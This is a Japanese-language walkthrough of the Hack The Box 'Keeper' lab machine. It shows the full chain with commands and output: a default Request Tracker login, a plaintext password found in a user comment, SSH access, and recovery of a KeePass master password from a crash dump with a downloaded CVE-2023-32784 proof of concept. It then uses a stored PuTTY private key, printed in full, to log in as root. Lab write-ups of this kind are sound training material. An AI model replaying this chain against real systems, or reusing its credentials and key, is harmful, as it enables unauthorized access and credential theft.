https://app.hackthebox.com/machines/Keeper

## STEP 1
```sh
└─$ rustscan -a 10.129.190.164 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.190.164:22
Open 10.129.190.164:80
10.129.190.164 -> [22,80]
```


## STEP 2
80番にアクセス  
別のurlにアクセスするよう言われている  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Keeper_01.png">  
/etc/hosts/を編集
```sh
└─$ echo '10.129.229.41 tickets.keeper.htb' | sudo tee -a /etc/hosts
10.129.229.41 tickets.keeper.htb
```
再度アクセス  
[リンク](https://rt-wiki.bestpractical.com/wiki/RecoverRootPassword)よりデフォルトクレデンシャル root/password が判明、ログインできた　　
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Keeper_02.png">  
Adminタブから lnorgaard というユーザを確認できるが、コメントからパスワードが「Welcome2023!」と判明した  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Keeper_03.png">  
22番が開いていたので、先ほどのクレデンシャルでsshログイン成功！ユーザフラグゲット
```sh
└─$ ssh lnorgaard@10.129.190.164    
The authenticity of host '10.129.190.164 (10.129.190.164)' can't be established.
ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.190.164' (ED25519) to the list of known hosts.
lnorgaard@10.129.190.164's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ cat user.txt
86a82b35f5d9dbf56d69283eafbf4ff7
```


## STEP 3
ユーザフラグと同フォルダ内に、zipがあったのでkaliにダウンロード
```sh
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt

lnorgaard@keeper:~$ exit
logout
Connection to 10.129.190.164 closed.

└─$ scp lnorgaard@10.129.190.164:/home/lnorgaard/RT30000.zip .
lnorgaard@10.129.190.164's password: 
RT30000.zip
```
zipには、メモリダンプファイルと.kdbxがあった  
kdbxはkeepass（パスワード管理ツール）のパスワードが入ったファイルだそう
```sh
└─$ unzip RT30000.zip                  
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx

└─$ file KeePassDumpFull.dmp                                                                                 
KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 type            

└─$ file passcodes.kdbx     
passcodes.kdbx: Keepass password database 2.x KDBX
```
.kdbxを開くにはkaliでは「keepass2」コマンドでできる  
実際に開くとパスワードが必要っぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Keeper_04.png">  
パスワードをクラックしてみたが、失敗．．．
```sh
└─$ keepass2john passcodes.kdbx > keepass.txt

└─$ john --wordlist /usr/share/wordlists/rockyou.txt --format=keepass keepass.txt
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:23 DONE (2025-07-12 07:25) 0g/s 153.5p/s 153.5c/s 153.5C/s notused..sss
Session completed.
```
先ほどのブラウザで、keepassのissueに関するチケットを lnorgaard が作成したこと確認  
とういことはzip内のメモリダンプはkeepassのクラッシュダンプね  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Keeper_05.png">  
ここでkeepassには、CVE-2023-32784が存在しクラッシュダンプからパスワードを復元できる脆弱性があるらしい  
PoCを試してみると文字列は抽出できたが、何文字が欠落しているっぽい
```sh
└─$ wget -nv https://raw.githubusercontent.com/z-jxy/keepass_dump/refs/heads/main/keepass_dump.py
--2025-07-12 10:30:42--  https://raw.githubusercontent.com/z-jxy/keepass_dump/refs/heads/main/keepass_dump.py

└─$ python3.13 keepass_dump.py -f KeePassDumpFull.dmp 
[*] Searching for masterkey characters
[-] Couldn't find jump points in file. Scanning with slower method.
[*] 0:  {UNKNOWN}
[*] 2:  d
[*] 3:  g
[*] 4:  r
[*] 6:  d
[*] 7:   
[*] 8:  m
[*] 9:  e
[*] 10: d
[*] 11:  
[*] 12: f
[*] 13: l
[*] 15: d
[*] 16: e
[*] Extracted: {UNKNOWN}dgrd med flde
```
ぐぐってみると、「rødgrød med fløde」の文字を発見  
deeplで翻訳してみるとデンマーク語らしい、どうやって入力するねん  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Keeper_06.png">  
「rødgrød med fløde」で開くことができた、どうやらputty形式のssh秘密鍵が保存されている
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Keeper_07.png">  
putty形式のssh秘密鍵を保存
```sh
└─$ cat putty                                                                                                           
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```
ssh秘密鍵に変換してrootログイン成功！ルートフラグゲット！
```sh
└─$ puttygen putty -O private-openssh -o ida_rsa

└─$ ssh -i ida_rsa root@10.129.190.164
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# cat root.txt
dd05820dc970d89af4d2893b0b9a3027
```
